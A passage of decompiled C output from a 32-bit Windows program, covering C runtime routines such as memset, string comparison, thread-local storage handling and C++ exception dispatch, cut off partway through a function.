    int32_t * v1 = (int32_t *)a1;
    int32_t v2 = *v1;
    int32_t result = v2; // 0x407642
    if (*(char *)(a1 + 4) != 0) {
        // 0x407644
        result = 0;
        if (v2 != 0) {
            int32_t v3 = v2;
            int32_t v4 = v3 + 1; // 0x407652
            while (*(char *)v3 != 0) {
                // 0x40764d
                v3 = v4;
                v4 = v3 + 1;
            }
            int32_t v5 = function_409c53(); // 0x40765c
            if (v5 != 0) {
                // 0x407668
                function_40aeb1(v5, 1 - v2 + v3, *v1);
                *(int32_t *)a2 = v5;
                *(char *)(a2 + 4) = 1;
            }
            // 0x407697
            return function_40ae11();
        }
    }
    // 0x40768c
    *(int32_t *)a2 = result;
    *(char *)(a2 + 4) = 0;
    // 0x407697
    return result;
}

// Address range: 0x40769a - 0x4076b9
int32_t function_40769a(int32_t a1) {
    char * v1 = (char *)(a1 + 4); // 0x4076a1
    int32_t result; // 0x40769a
    if (*v1 != 0) {
        // 0x4076a7
        result = function_40ae11();
    }
    // 0x4076af
    *(int32_t *)a1 = 0;
    *v1 = 0;
    return result;
}

// Address range: 0x4076b9 - 0x407728
int32_t function_4076b9(int32_t * dwExceptionCode, int32_t * a2) {
    int32_t v1 = (int32_t)a2;
    int32_t v2 = 8; // bp-52, 0x4076c5
    int32_t v3; // bp-48, 0x4076b9
    int32_t v4 = &v3; // 0x4076c7
    int32_t v5; // bp-36, 0x4076b9
    __asm_rep_movsd_memcpy((char *)&v5, (char *)&g22, 8);
    int32_t v6 = v4; // 0x4076d7
    int32_t dwExceptionFlags = v1; // 0x4076d7
    if (a2 != NULL) {
        // 0x4076d9
        v6 = v4;
        dwExceptionFlags = v1;
        if ((*(char *)a2 & 16) != 0) {
            int32_t v7 = *dwExceptionCode - 4; // 0x4076e0
            v2 = v7;
            function_406b3d();
            v6 = &v2;
            dwExceptionFlags = *(int32_t *)(*(int32_t *)v7 + 24);
        }
    }
    // 0x4076f6
    int32_t v8; // bp-16, 0x4076b9
    if (dwExceptionFlags != 0) {
        // 0x407700
        if ((*(char *)dwExceptionFlags & 8) != 0) {
            // 0x407705
            v8 = 0x1994000;
        }
    }
    // 0x40770c
    *(int32_t *)(v6 - 4) = (int32_t)&v8;
    *(int32_t *)(v6 - 16) = v5;
    RaiseException((int32_t)dwExceptionCode, dwExceptionFlags, (int32_t)&g266, &g266);
    return &g266;
}

// Address range: 0x407730 - 0x40788a
int32_t function_407730(int32_t result, int32_t a2, int32_t a3) {
    if (a3 == 0) {
        // 0x407883
        return result;
    }
    int32_t v1 = 0x1010101 * (a2 & 255); // 0x407747
    int32_t v2 = a3; // 0x407750
    int32_t v3 = result; // 0x407750
    int32_t v4; // 0x407730
    int32_t v5; // 0x407730
    int32_t v6; // 0x407730
    int32_t v7; // 0x407730
    int128_t v8; // 0x407730
    if (a3 < 33) {
        goto lab_0x407835;
    } else {
        // 0x407756
        v4 = a3;
        v6 = result;
        if (a3 < 128) {
            goto lab_0x4077ed;
        } else {
            // 0x407762
            if ((g163 & 2) != 0) {
                // 0x40776c
                __asm_rep_stosb_memset((char *)result, (char)v1, a3);
                return result;
            }
            // 0x407775
            v2 = a3;
            v3 = result;
            if ((g114 & 2) == 0) {
                goto lab_0x407835;
            } else {
                int128_t v9 = __asm_pshufd(__asm_movd(v1), 0); // 0x407787
                __asm_movups_1(*(int128_t *)result, v9);
                int32_t v10 = result + 16 & -16; // 0x407794
                int32_t v11 = a3 + result - v10; // 0x407797
                v4 = v11;
                v6 = v10;
                if (v11 < 129) {
                    goto lab_0x4077ed;
                } else {
                    __asm_movdqa(*(int128_t *)v10, v9);
                    __asm_movdqa(*(int128_t *)(v10 + 16), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 32), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 48), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 64), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 80), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 96), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 112), v9);
                    int32_t v12 = v10 + 128; // 0x4077d7
                    int32_t v13 = v11 - 128; // 0x4077dd
                    int32_t v14 = v13; // 0x4077e9
                    int32_t v15 = v12; // 0x4077e9
                    v8 = v9;
                    v5 = v13;
                    v7 = v12;
                    while (v13 >= 256) {
                        // 0x4077b0
                        __asm_movdqa(*(int128_t *)v15, v9);
                        __asm_movdqa(*(int128_t *)(v15 + 16), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 32), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 48), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 64), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 80), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 96), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 112), v9);
                        v12 = v15 + 128;
                        v13 = v14 - 128;
                        v14 = v13;
                        v15 = v12;
                        v8 = v9;
                        v5 = v13;
                        v7 = v12;
                    }
                    goto lab_0x407800;
                }
            }
        }
    }
  lab_0x407835:;
    int32_t v16 = v2; // 0x40783b
    int32_t v17 = v3; // 0x40783b
    if ((v2 & 3) != 0) {
        int32_t v18 = v2; // 0x407840
        int32_t v19 = v3; // 0x40783f
        *(char *)v19 = (char)v1;
        v19++;
        v18--;
        v16 = v18;
        v17 = v19;
        while ((v18 & 3) != 0) {
            // 0x40783d
            *(char *)v19 = (char)v1;
            v19++;
            v18--;
            v16 = v18;
            v17 = v19;
        }
    }
    int32_t v20 = v16; // 0x407851
    int32_t v21 = v17; // 0x407851
    if ((v16 & 4) != 0) {
        // 0x407853
        *(int32_t *)v17 = v1;
        v20 = v16 - 4;
        v21 = v17 + 4;
    }
    // 0x40785b
    if (v20 < 8) {
        // 0x407883
        return result;
    }
    int32_t v22 = v21; // 0x407861
    *(int32_t *)v22 = v1;
    *(int32_t *)(v22 + 4) = v1;
    int32_t v23 = v20 - 8; // 0x407878
    int32_t v24 = v23; // 0x407881
    v22 += 8;
    while (v23 >= 8) {
        // 0x407870
        *(int32_t *)v22 = v1;
        *(int32_t *)(v22 + 4) = v1;
        v23 = v24 - 8;
        v24 = v23;
        v22 += 8;
    }
    // 0x407883
    return result;
  lab_0x4077ed:
    // 0x4077ed
    v2 = v4;
    v3 = v6;
    if ((g114 & 2) == 0) {
        goto lab_0x407835;
    } else {
        // 0x4077f7
        v8 = __asm_pshufd(__asm_movd(v1), 0);
        v5 = v4;
        v7 = v6;
        goto lab_0x407800;
    }
  lab_0x407800:;
    int32_t v25 = v5; // 0x407803
    int32_t v26 = v7; // 0x407803
    if (v5 >= 32) {
        __asm_movdqu(*(int128_t *)v7, v8);
        __asm_movdqu(*(int128_t *)(v7 + 16), v8);
        int32_t v27 = v7 + 32; // 0x40780e
        int32_t v28 = v5 - 32; // 0x407811
        int32_t v29 = v28; // 0x407817
        int32_t v30 = v27; // 0x407817
        while (v28 >= 32) {
            // 0x407805
            __asm_movdqu(*(int128_t *)v30, v8);
            __asm_movdqu(*(int128_t *)(v30 + 16), v8);
            v27 = v30 + 32;
            v28 = v29 - 32;
            v29 = v28;
            v30 = v27;
        }
        // 0x407819
        v25 = v28;
        v26 = v27;
        if ((v28 & 31) == 0) {
            // 0x407883
            return result;
        }
    }
    int32_t v31 = v25 - 32 + v26; // 0x407821
    __asm_movdqu(*(int128_t *)v31, v8);
    __asm_movdqu(*(int128_t *)(v31 + 16), v8);
    return result;
}

// Address range: 0x40788a - 0x4078c6
int32_t function_40788a(int32_t a1, int32_t a2, int32_t a3) {
    if (a1 == a2) {
        // 0x407897
        return 0;
    }
    int32_t v1 = a1 + 5; // 0x40789e
    int32_t v2 = a2 + 5; // 0x40789e
    unsigned char v3 = *(char *)v1; // 0x4078a1
    unsigned char v4 = *(char *)v2; // 0x4078a3
    bool v5; // 0x40788a
    while (v3 == v4) {
        if (v3 == 0) {
            // 0x407897
            return 0;
        }
        unsigned char v6 = *(char *)(v1 + 1); // 0x4078ab
        unsigned char v7 = *(char *)(v2 + 1); // 0x4078ae
        if (v6 != v7) {
            // 0x4078bf
            v5 = v6 < v7;
            return v5 ? -1 : 1;
        }
        // 0x4078b3
        v1 += 2;
        v2 += 2;
        if (v6 == 0) {
            // 0x407897
            return 0;
        }
        v3 = *(char *)v1;
        v4 = *(char *)v2;
    }
    // 0x4078bf
    v5 = v3 < v4;
  lab_0x4078bf_2:
    // 0x4078bf
    return v5 ? -1 : 1;
}

// Address range: 0x4078c6 - 0x4078e2
int32_t function_4078c6(int32_t a1) {
    int32_t result = a1; // 0x4078ce
    if (a1 != 0 && a1 != (int32_t)&g177) {
        // 0x4078d7
        result = function_40ae11();
    }
    // 0x4078de
    return result;
}

// Address range: 0x4078e2 - 0x4078f0
int32_t function_4078e2(void) {
    int32_t result = function_4078f0(); // 0x4078e2
    if (result != 0) {
        // 0x4078ef
        return result;
    }
    function_40af0b();
    // UNREACHABLE
}

// Address range: 0x4078f0 - 0x407982
int32_t function_4078f0(void) {
    // 0x4078f0
    if (g116 == -1) {
        // 0x4078f9
        return 0;
    }
    int32_t errorCode = GetLastError(); // 0x4078fe
    int32_t result = function_408930((int32_t)g116); // 0x40790c
    if (result == -1) {
        // 0x407976
        SetLastError(0x1000000 * errorCode / 0x1000000);
        return 0;
    }
    // 0x407919
    if (result != 0) {
        // 0x407976
        SetLastError(0x1000000 * errorCode / 0x1000000);
        return result;
    }
    int32_t v1 = function_40896b((int32_t)g116, -1); // 0x407925
    if (v1 == 0) {
        // 0x407976
        SetLastError(0x1000000 * errorCode / 0x1000000);
        return 0;
    }
    int32_t v2 = function_40896b((int32_t)g116, 0x1000000 * v1 / 0x1000000); // 0x40794d
    int32_t result2 = v1; // 0x407956
    if (v2 == 0) {
        // 0x407958
        function_40896b((int32_t)g116, 0);
        result2 = 0;
    }
    // 0x40796e
    function_40ae11();
    // 0x407976
    SetLastError(0x1000000 * errorCode / 0x1000000);
    return result2;
}

// Address range: 0x407982 - 0x4079c6
int32_t function_407982(void) {
    int32_t v1 = function_4088ba(0x4078c6); // 0x407987
    g116 = v1;
    if (v1 == -1) {
        // 0x4079c0
        return -256;
    }
    int32_t v2 = function_40896b(v1, (int32_t)&g177); // 0x40799d
    if (v2 != 0) {
        // 0x4079c3
        return v2 & -256 | 1;
    }
    int32_t result = -256; // 0x4079b0
    if (g116 != -1) {
        int32_t v3 = function_4088f5((int32_t)g116); // 0x4079b3
        g116 = -1;
        result = v3 & -256;
    }
    // 0x4079c0
    return result;
}

// Address range: 0x4079c6 - 0x4079e1
int32_t function_4079c6(int32_t a1) {
    int32_t result = -255; // 0x4079ce
    if (g116 != -1) {
        int32_t v1 = function_4088f5((int32_t)g116); // 0x4079d1
        g116 = -1;
        result = v1 & -256 | 1;
    }
    // 0x4079de
    return result;
}

// Address range: 0x4079f0 - 0x407a3c
int32_t function_4079f0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4079f0
    int32_t v1; // bp-4, 0x4079f0
    function_408ce0(a3, &v1);
    int32_t v2 = *(int32_t *)(a3 + 16); // 0x407a1c
    return function_408ce0(v2 != 256 ? v2 : 2, (int32_t *)a3);
}

// Address range: 0x407a3c - 0x407a57
int32_t function_407a3c(int32_t a1) {
    // 0x407a3c
    int32_t v1; // 0x407a3c
    int32_t v2; // 0x407a3c
    function_40688c(a1, v1, v2);
    int32_t result; // 0x407a3c
    *(int32_t *)result = (int32_t)&g23;
    return result;
}

// Address range: 0x407a57 - 0x407a6f
int32_t function_407a57(void) {
    // 0x407a57
    int32_t result; // 0x407a57
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 4) = (int32_t)"bad exception";
    *(int32_t *)result = (int32_t)&g23;
    return result;
}

// Address range: 0x407a6f - 0x407a8e
int32_t function_407a6f(int32_t a1) {
    // 0x407a6f
    int32_t v1; // 0x407a6f
    int32_t v2; // 0x407a6f
    int32_t v3 = function_40788a(v2 + 4, a1 + 4, v1); // 0x407a7d
    return -v3 & -256 | (int32_t)(v3 == 0);
}

// Address range: 0x407a8e - 0x407b18
int32_t function_407a8e(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    // 0x407a8e
    function_406cf0(&g83, 56, (int32_t)&g266);
    int32_t v1; // 0x407a8e
    int32_t * v2 = (int32_t *)(v1 + 24); // 0x407a9a
    int32_t * v3 = (int32_t *)(v1 - 28); // 0x407a9d
    *v3 = *v2;
    *(int32_t *)(v1 - 60) = 0;
    int32_t v4 = *(int32_t *)(v1 + 12); // 0x407aa4
    *(int32_t *)(v1 - 44) = *(int32_t *)(v4 - 4);
    int32_t v5 = *(int32_t *)(v1 + 8); // 0x407aad
    *(int32_t *)(v1 - 48) = function_40730f(v1 - 72, *(int32_t *)(v5 + 24));
    *(int32_t *)(v1 - 52) = *(int32_t *)(function_4078e2() + 16);
    *(int32_t *)(v1 - 56) = *(int32_t *)(function_4078e2() + 20);
    *(int32_t *)(function_4078e2() + 16) = v5;
    *(int32_t *)(function_4078e2() + 20) = *(int32_t *)(v1 + 16);
    int32_t * v6 = (int32_t *)(v1 - 4); // 0x407aea
    *(int32_t *)(v1 - 64) = 1;
    *v6 = 1;
    int32_t v7 = *v2; // 0x407afd
    int32_t v8 = *(int32_t *)(v1 + 20); // 0x407b00
    *v3 = 1;
    *v6 = 0;
    return function_407ba8(v4, v8, v7, *(int32_t *)(v1 + 28), *(int32_t *)(v1 + 32));
}

// Address range: 0x407b18 - 0x407b22
int32_t function_407b18(void) {
    // 0x407b18
    int32_t v1; // 0x407b18
    return function_407cfd(*(int32_t *)(v1 - 20));
}

// Address range: 0x407b22 - 0x407ba8
int32_t function_407b22(void) {
    // 0x407b22
    int32_t v1; // 0x407b22
    int32_t v2 = *(int32_t *)(v1 - 24); // 0x407b22
    *(int32_t *)(function_4078e2() + 32) = 0;
    int32_t v3 = *(int32_t *)(v1 + 20); // 0x407b2e
    int32_t * v4 = (int32_t *)(v1 + 12); // 0x407b31
    int32_t v5 = *v4; // 0x407b31
    int32_t v6 = v5 + 8;
    int32_t v7; // 0x407b22
    if (*(int32_t *)(v3 + 4) > 128) {
        // 0x407b43
        v7 = *(int32_t *)v6;
    } else {
        // 0x407b3d
        v7 = (int32_t)*(char *)v6;
    }
    int32_t * v8 = (int32_t *)(v1 - 32); // 0x407b46
    *v8 = v7;
    int32_t * v9 = (int32_t *)(v1 - 40); // 0x407b4e
    *v9 = 0;
    int32_t * v10 = (int32_t *)(v3 + 12); // 0x407b51
    int32_t v11 = v5; // 0x407b54
    int32_t v12 = v7; // 0x407b54
    if (*v10 != 0) {
        int32_t v13 = 0; // 0x407b87
        int32_t v14; // 0x407b5c
        int32_t v15; // 0x407b60
        while (true) {
            int32_t v16 = 20 * v13; // 0x407b56
            *(int32_t *)(v1 - 36) = v16;
            int32_t v17 = v16 + *(int32_t *)(v3 + 16);
            v14 = *(int32_t *)(v17 + 4);
            v15 = *v4;
            if (v7 > v14) {
                // 0x407b65
                if (v7 <= *(int32_t *)(v17 + 8)) {
                    // break -> 0x407b71
                    break;
                }
            }
            // 0x407b87
            v13++;
            *v9 = v13;
            v11 = v15;
            v12 = v7;
            if (v13 >= *v10) {
                goto lab_0x407b90;
            }
        }
        int32_t v18 = v14 + 1; // 0x407b78
        *v8 = v18;
        int32_t v19 = *(int32_t *)(*(int32_t *)(v3 + 8) + 8 * v18); // 0x407b7f
        *v8 = v19;
        v11 = v15;
        v12 = v19;
    }
  lab_0x407b90:
    // 0x407b90
    *(int32_t *)(v2 - 4) = v12;
    *(int32_t *)(v2 - 8) = v3;
    *(int32_t *)(v2 - 12) = 0;
    *(int32_t *)(v2 - 16) = v11;
    int32_t result = function_408465(); // 0x407b95
    *(int32_t *)(v1 - 28) = 0;
    *(int32_t *)(v1 - 4) = 0;
    return result;
}

// Address range: 0x407ba8 - 0x407bc3
int32_t function_407ba8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x407ba8
    int32_t v1; // 0x407ba8
    *(int32_t *)(v1 - 4) = -2;
    *(int32_t *)(v1 - 64) = 0;
    function_407bc9();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x407bbd
    return result;
}

// Address range: 0x407bc9 - 0x407c4a
int32_t function_407bc9(void) {
    // 0x407bc9
    int32_t v1; // 0x407bc9
    int32_t v2; // 0x407bc9
    *(int32_t *)(v2 - 4) = *(int32_t *)(v1 - 44);
    function_407333(*(int32_t *)(v1 - 48));
    *(int32_t *)(function_4078e2() + 16) = *(int32_t *)(v1 - 52);
    int32_t result = function_4078e2(); // 0x407be3
    *(int32_t *)(result + 20) = *(int32_t *)(v1 - 56);
    int32_t v3; // 0x407bc9
    if (v3 != -0x1f928c9d || *(int32_t *)(v3 + 16) != 3) {
        // 0x407c49
        return result;
    }
    int32_t v4 = *(int32_t *)(v3 + 20); // 0x407bfc
    if ((v4 & -2) != 0x19930520 == (v4 != 0x19930522) || *(int32_t *)(v1 - 28) == 0 | *(int32_t *)(v1 - 60) != 0) {
        // 0x407c49
        return result;
    }
    int32_t result2 = 0; // 0x407c2f
    if (function_408dce(*(int32_t *)(v3 + 24)) != 0) {
        // 0x407c31
        result2 = function_408d2b();
    }
    // 0x407c49
    return result2;
}

// Address range: 0x407c4a - 0x407c83
int32_t function_407c4a(void) {
    // 0x407c4a
    function_411863(4, (int32_t)&g266);
    if (*(int32_t *)(function_4078e2() + 28) != 0) {
        // 0x407c7e
        function_40ae16();
        // UNREACHABLE
    }
    // 0x407c61
    int32_t v1; // 0x407c4a
    *(int32_t *)(v1 - 4) = 0;
    function_408d0e();
    // UNREACHABLE
}

// Address range: 0x407c84 - 0x407cfd
int32_t function_407c84(char a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10) {
    int32_t v1 = a1;
    if (a7 != 0) {
        // 0x407c96
        int32_t v2; // 0x407c84
        int32_t v3; // 0x407c84
        int32_t v4; // 0x407c84
        int32_t v5; // 0x407c84
        function_4082a2(v1, a2, a6, 0x1000000 * a7 / 0x1000000, v2, v3, v5, v4);
    }
    // 0x407ca6
    function_407289(a10 != 0 ? a10 : a2, v1);
    function_408465();
    *(int32_t *)(a2 + 8) = *(int32_t *)(a8 + 4) + 1;
    return function_407a8e(v1, a2, a3, a5, *(int32_t *)(a6 + 12), a9, 256);
}

// Address range: 0x407cfd - 0x407d47
int32_t function_407cfd(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x407d03
    if (*(int32_t *)v1 != -0x1f928c9d || *(int32_t *)(v1 + 16) != 3) {
        // 0x407d43
        return 0;
    }
    int32_t v2 = *(int32_t *)(v1 + 20); // 0x407d13
    if ((v2 & -2) != 0x19930520 == (v2 != 0x19930522) || *(int32_t *)(v1 + 28) != 0) {
        // 0x407d43
        return 0;
    }
    // 0x407d34
    *(int32_t *)(function_4078e2() + 32) = 1;
    return 1;
}

// Address range: 0x407d47 - 0x4080c7
int32_t function_407d47(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, char a6, int32_t a7, int32_t a8) {
    int32_t v1 = *(int32_t *)(a5 + 4); // 0x407d5e
    int32_t v2 = a2 + 8;
    int32_t v3; // 0x407d47
    if (v1 > 128) {
        // 0x407d6d
        v3 = *(int32_t *)v2;
    } else {
        // 0x407d67
        v3 = (int32_t)*(char *)v2;
    }
    int32_t v4 = v3;
    if (v4 > -2 != v4 < v1) {
        // 0x40807b
        function_40ae16();
        // UNREACHABLE
    }
    int32_t * v5 = (int32_t *)a1;
    int32_t v6 = a3; // 0x407d8e
    int32_t v7 = a1; // 0x407d8e
    int32_t v8; // 0x407d47
    int32_t v9; // 0x407d47
    int32_t v10; // 0x407d47
    int32_t v11; // 0x407d47
    int32_t v12; // 0x407d47
    int32_t v13; // 0x407d47
    int32_t v14; // bp-24, 0x407d47
    int32_t v15; // 0x407d47
    int32_t v16; // 0x407d47
    int32_t v17; // bp-48, 0x407d47
    char v18; // 0x407d47
    char v19; // 0x407d47
    char v20; // 0x407d47
    char v21; // 0x407d47
    if (*v5 != -0x1f928c9d) {
        goto lab_0x408028;
    } else {
        // 0x407d94
        int32_t v22; // bp-84, 0x407d47
        int32_t v23 = &v22; // 0x407d52
        int32_t * v24 = v5; // 0x407d98
        int32_t v25 = a3; // 0x407d98
        int32_t v26 = 0; // 0x407d98
        int32_t v27 = a1; // 0x407d98
        if (*(int32_t *)(a1 + 16) == 3) {
            int32_t v28 = *(int32_t *)(a1 + 20); // 0x407d9e
            v24 = v5;
            v25 = a3;
            v26 = 0;
            v27 = a1;
            if ((v28 & -2) != 0x19930520 != v28 != 0x19930522) {
                // 0x407dbd
                v24 = v5;
                v25 = a3;
                v26 = 0;
                v27 = a1;
                if (*(int32_t *)(a1 + 28) == 0) {
                    int32_t result = function_4078e2(); // 0x407dc6
                    if (*(int32_t *)(result + 16) == 0) {
                        // 0x408054
                        return result;
                    }
                    int32_t v29 = *(int32_t *)(function_4078e2() + 16); // 0x407dd9
                    int32_t v30 = function_4078e2(); // 0x407ddc
                    if (v29 == 0) {
                        // 0x40807b
                        function_40ae16();
                        // UNREACHABLE
                    }
                    int32_t v31 = *(int32_t *)(v30 + 20); // 0x407de5
                    int32_t * v32 = (int32_t *)v29;
                    if (*v32 == -0x1f928c9d) {
                        // 0x407dfb
                        if (*(int32_t *)(v29 + 16) == 3) {
                            int32_t v33 = *(int32_t *)(v29 + 20); // 0x407e01
                            if ((v33 & -2) != 0x19930520 != v33 != 0x19930522) {
                                // branch -> 0x407e25
                            }
                        }
                    }
                    int32_t v34 = *(int32_t *)(function_4078e2() + 28); // 0x407e2a
                    v24 = v32;
                    v25 = v31;
                    v26 = 1;
                    v27 = v29;
                    if (v34 != 0) {
                        int32_t v35 = *(int32_t *)(function_4078e2() + 28); // 0x407e34
                        *(int32_t *)(function_4078e2() + 28) = 0;
                        int32_t v36 = function_4081e3(v29, v35); // 0x407e46
                        v24 = v32;
                        v25 = v31;
                        v26 = 1;
                        v27 = v29;
                        if ((char)v36 == 0) {
                            int32_t * v37 = (int32_t *)v35; // 0x407e54
                            int32_t v38 = 0; // 0x407e56
                            int32_t v39 = 0; // 0x407e56
                            if (*v37 <= 0) {
                                // 0x40807b
                                function_40ae16();
                                // UNREACHABLE
                            }
                            int32_t v40 = v23;
                            int32_t v41 = v40 - 4; // 0x407e64
                            *(int32_t *)v41 = (int32_t)&g148;
                            while ((char)function_407a6f(v38) == 0) {
                                // 0x407e7a
                                v39++;
                                v38 += 16;
                                if (v39 >= *v37) {
                                    // 0x40807b
                                    function_40ae16();
                                    // UNREACHABLE
                                }
                                v40 = v41;
                                v41 = v40 - 4;
                                *(int32_t *)v41 = (int32_t)&g148;
                            }
                            int32_t * v42 = (int32_t *)(v40 - 8); // 0x40805b
                            *v42 = 1;
                            int32_t * v43 = (int32_t *)(v40 - 12); // 0x40805d
                            *v43 = v29;
                            function_408d2b();
                            function_407a57();
                            *v42 = (int32_t)&g85;
                            int32_t v44; // bp-72, 0x407d47
                            *v43 = (int32_t)&v44;
                            function_4076b9(&g266, &g266);
                            // 0x40807b
                            function_40ae16();
                            // UNREACHABLE
                        }
                    }
                }
            }
        }
        // 0x407e9b
        v6 = v25;
        v7 = v27;
        if (*v24 != -0x1f928c9d) {
            goto lab_0x408028;
        } else {
            // 0x407ea7
            v6 = v25;
            v7 = v27;
            if (*(int32_t *)(v27 + 16) != 3) {
                goto lab_0x408028;
            } else {
                int32_t v45 = *(int32_t *)(v27 + 20); // 0x407eb1
                v6 = v25;
                v7 = v27;
                if ((v45 & -2) != 0x19930520 == (v45 != 0x19930522)) {
                    goto lab_0x408028;
                } else {
                    // 0x407ed0
                    v21 = 0;
                    if (*(int32_t *)(a5 + 12) != 0) {
                        int32_t v46 = function_4071df(a5, a7, v4, &v14, &v17); // 0x407ee6
                        v21 = 0;
                        if (v14 < v17) {
                            int32_t * v47 = (int32_t *)(v27 + 28);
                            int32_t * v48 = (int32_t *)(v23 - 4);
                            int32_t * v49 = (int32_t *)(v23 - 8);
                            int32_t * v50 = (int32_t *)(v23 - 12);
                            v8 = v17;
                            v15 = v46 + 16;
                            v18 = 0;
                            v10 = v4;
                            v12 = v14;
                            while (true) {
                              lab_0x407f03:;
                                int32_t v51 = v12;
                                int32_t v52 = v10;
                                char v53 = v18;
                                v16 = v15;
                                int32_t v54 = v8;
                                int32_t v55 = v16 - 16; // 0x407f03
                                v9 = v54;
                                v20 = v53;
                                v11 = v52;
                                v13 = v51;
                                if (*(int32_t *)v55 > v52) {
                                    goto lab_0x407fc3;
                                } else {
                                    // 0x407f15
                                    v9 = v54;
                                    v20 = v53;
                                    v11 = v52;
                                    v13 = v51;
                                    if (v52 > *(int32_t *)(v16 - 12)) {
                                        goto lab_0x407fc3;
                                    } else {
                                        int32_t v56 = *(int32_t *)(v16 - 4); // 0x407f23
                                        v9 = v54;
                                        v20 = v53;
                                        v11 = v52;
                                        v13 = v51;
                                        if (v56 < 1) {
                                            goto lab_0x407fc3;
                                        } else {
                                            int32_t v57 = *(int32_t *)(*v47 + 12); // 0x407f37
                                            uint32_t v58 = *(int32_t *)v57; // 0x407f3a
                                            int32_t v59 = v56;
                                            int32_t v60 = *(int32_t *)v16;
                                            int32_t v61 = v57; // 0x407f50
                                            int32_t v62 = v58; // 0x407f50
                                            int32_t v63; // 0x407d47
                                            int32_t v64; // 0x407d47
                                            int32_t * v65; // 0x407d47
                                            int32_t v66; // 0x407f6c
                                            if (v58 >= 1) {
                                                v64 = v62;
                                                v63 = v61 + 4;
                                                *v48 = *v47;
                                                v65 = (int32_t *)v63;
                                                *v49 = *v65;
                                                *v50 = v60;
                                                if (function_40862f(v64, v63, (int32_t)&g266) != 0) {
                                                    // 0x407f91
                                                    *v48 = v26;
                                                    *v49 = a8;
                                                    *v50 = a7;
                                                    *(int32_t *)(v23 - 16) = v55;
                                                    *(int32_t *)(v23 - 20) = *v65;
                                                    *(int32_t *)(v23 - 24) = v60;
                                                    *(int32_t *)(v23 - 28) = a5;
                                                    *(int32_t *)(v23 - 32) = a4;
                                                    *(int32_t *)(v23 - 36) = v25;
                                                    *(int32_t *)(v23 - 40) = a2;
                                                    *(int32_t *)(v23 - 44) = v27;
                                                    function_407c84(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                    v19 = 1;
                                                    goto lab_0x407fba;
                                                }
                                                // 0x407f66
                                                v66 = v64 - 1;
                                                v61 = v63;
                                                while (v66 >= 0 == (v66 != 0)) {
                                                    // 0x407f52
                                                    v64 = v66;
                                                    v63 = v61 + 4;
                                                    *v48 = *v47;
                                                    v65 = (int32_t *)v63;
                                                    *v49 = *v65;
                                                    *v50 = v60;
                                                    if (function_40862f(v64, v63, (int32_t)&g266) != 0) {
                                                        // 0x407f91
                                                        *v48 = v26;
                                                        *v49 = a8;
                                                        *v50 = a7;
                                                        *(int32_t *)(v23 - 16) = v55;
                                                        *(int32_t *)(v23 - 20) = *v65;
                                                        *(int32_t *)(v23 - 24) = v60;
                                                        *(int32_t *)(v23 - 28) = a5;
                                                        *(int32_t *)(v23 - 32) = a4;
                                                        *(int32_t *)(v23 - 36) = v25;
                                                        *(int32_t *)(v23 - 40) = a2;
                                                        *(int32_t *)(v23 - 44) = v27;
                                                        function_407c84(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                        v19 = 1;
                                                        goto lab_0x407fba;
                                                    }
                                                    // 0x407f66
                                                    v66 = v64 - 1;
                                                    v61 = v63;
                                                }
                                            }
                                            // 0x407f7d
                                            v19 = v53;
                                            while (v59 >= 2) {
                                                // 0x407f89
                                                v59--;
                                                v60 += 16;
                                                v61 = v57;
                                                v62 = v58;
                                                if (v58 >= 1) {
                                                    v64 = v62;
                                                    v63 = v61 + 4;
                                                    *v48 = *v47;
                                                    v65 = (int32_t *)v63;
                                                    *v49 = *v65;
                                                    *v50 = v60;
                                                    if (function_40862f(v64, v63, (int32_t)&g266) != 0) {
                                                        // 0x407f91
                                                        *v48 = v26;
                                                        *v49 = a8;
                                                        *v50 = a7;
                                                        *(int32_t *)(v23 - 16) = v55;
                                                        *(int32_t *)(v23 - 20) = *v65;
                                                        *(int32_t *)(v23 - 24) = v60;
                                                        *(int32_t *)(v23 - 28) = a5;
                                                        *(int32_t *)(v23 - 32) = a4;
                                                        *(int32_t *)(v23 - 36) = v25;
                                                        *(int32_t *)(v23 - 40) = a2;
                                                        *(int32_t *)(v23 - 44) = v27;
                                                        function_407c84(1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                                                        v19 = 1;
                                                        goto lab_0x407fba;
                                                    }
                                                    // 0x407f66
                                                    v66 = v64 - 1;
                                                    v61 = v63;
                                                    while (v66 >= 0 == (v66 != 0)) {
                                                        // 0x407f52
                                                        v64 = v66;
                                                        v63 = v61 + 4;
                                                        *v48 = *v47;
                                                        v65 = (int32_t *)v63;
                                                        *v49 = *v65;
                                                        *v50 = v60;
                                                        if (function_40862f(v64, v63, (int32_t)&g266) != 0) {
                                                            // 0x407f91
                                                            *v48 = v26;
                                                            *v49 = a8;
                                                            *v50 = a7;
                                                            *(int32_t *)(v23 - 16) = v55;
                                                            *(int32_t *)(v23 - 20) = *v65;
